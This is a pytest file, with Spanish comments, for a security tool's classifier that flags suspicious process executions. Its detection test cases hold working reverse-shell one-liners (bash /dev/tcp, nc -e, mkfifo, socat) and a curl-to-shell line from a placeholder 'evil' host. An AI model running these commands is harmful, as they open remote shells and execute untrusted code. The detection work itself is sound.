"""Tests del clasificador de ejecuciones sospechosas (execwatch).

La lógica `classify` es pura: se prueba con dicts de proceso a mano, sin /proc.
"""
import os

from centinel.core import Severity
from centinel.collectors.execwatch import classify, ExecWatchCollector


def _info(exe="", comm="", cmdline=""):
    return {"exe": exe, "comm": comm, "cmdline": cmdline}


# ---- camino limpio ----

def test_proceso_normal_no_marca():
    flags, sev = classify(_info("/usr/bin/sshd", "sshd", "/usr/bin/sshd -D"))
    assert flags == [] and sev == 0


def test_python_normal_no_marca():
    flags, sev = classify(_info("/usr/bin/python3", "python3",
                                "/usr/bin/python3 /opt/app/server.py"))
    assert flags == []


# ---- reverse shells (CRÍTICO) ----

def test_bash_dev_tcp_es_critico():
    flags, sev = classify(_info("/usr/bin/bash", "bash",
                                "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"))
    assert sev == int(Severity.CRITICAL)
    assert any("dev/tcp" in f.lower() for f in flags)


def test_netcat_e_es_critico():
    flags, sev = classify(_info("/bin/nc", "nc",
                                "nc -e /bin/sh 10.0.0.1 4444"))
    assert sev == int(Severity.CRITICAL)


def test_mkfifo_pipe_shell_es_critico():
    flags, sev = classify(_info("/bin/sh", "sh",
                                "mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f"))
    assert sev == int(Severity.CRITICAL)


def test_python_pty_spawn_es_critico():
    flags, sev = classify(_info("/usr/bin/python3", "python3",
                                "python3 -c import pty; pty.spawn('/bin/bash')"))
    assert sev == int(Severity.CRITICAL)


def test_socat_exec_es_critico():
    flags, sev = classify(_info("/usr/bin/socat", "socat",
                                "socat tcp:10.0.0.1:4444 exec:/bin/bash"))
    assert sev == int(Severity.CRITICAL)


# ---- descarga y ejecución (ALTO) ----

def test_curl_pipe_sh_es_high():
    flags, sev = classify(_info("/bin/sh", "sh",
                                "sh -c curl http://evil/x.sh | sh"))
    assert sev == int(Severity.HIGH)
    assert any("curl" in f.lower() or "descarga" in f.lower() for f in flags)


def test_base64_decode_pipe_shell_es_high():
    flags, sev = classify(_info("/bin/bash", "bash",
                                "bash -c echo aGk= | base64 -d | bash"))
    assert sev == int(Severity.HIGH)


# ---- servicio de red que lanza shell (CRÍTICO: RCE) ----

def test_servicio_red_lanza_shell_es_critico():
    flags, sev = classify(_info("/bin/bash", "bash", "/bin/bash"),
                          parent_comm="nginx")
    assert sev == int(Severity.CRITICAL)
    assert any("rce" in f.lower() or "demonio" in f.lower() for f in flags)


def test_shell_normal_con_padre_shell_no_es_critico():
    # bash hijo de bash (terminal normal) NO debe ser crítico.
    flags, sev = classify(_info("/bin/bash", "bash", "/bin/bash"),
                          parent_comm="bash")
    assert sev == 0


# ---- exec efímero / oculto (ALTO) ----

def test_exec_desde_tmp_es_high():
    flags, sev = classify(_info("/tmp/.x", ".x", "/tmp/.x"))
    assert sev == int(Severity.HIGH)
    assert any("efímero" in f for f in flags)
    assert any("oculto" in f for f in flags)


def test_binario_borrado_es_high():
    flags, sev = classify(_info("/tmp/payload (deleted)", "payload",
                                "/tmp/payload"))
    assert sev == int(Severity.HIGH)
    assert any("borrado" in f for f in flags)


def test_script_oculto_con_interprete_legitimo():
    flags, sev = classify(_info("/usr/bin/python3", "python3",
                                "/usr/bin/python3 /tmp/.rev.py"))
    assert sev == int(Severity.HIGH)
    assert any("script" in f for f in flags)


# ---- colector ----

def test_available_solo_linux_con_proc():
    col = ExecWatchCollector(bus=None)
    assert col.available() == (os.name == "posix" and os.path.isdir("/proc"))


def test_execwatch_en_layers_need_sustained_root():
    from centinel.security import layers_need_sustained_root

    class Args:
        execwatch = True
        beacon = False
        netwatch = False
        dnswatch = False
        rootcheck = False
        respond_live = False
        sniff = False

    need = layers_need_sustained_root(Args())
    assert any("execwatch" in n for n in need)
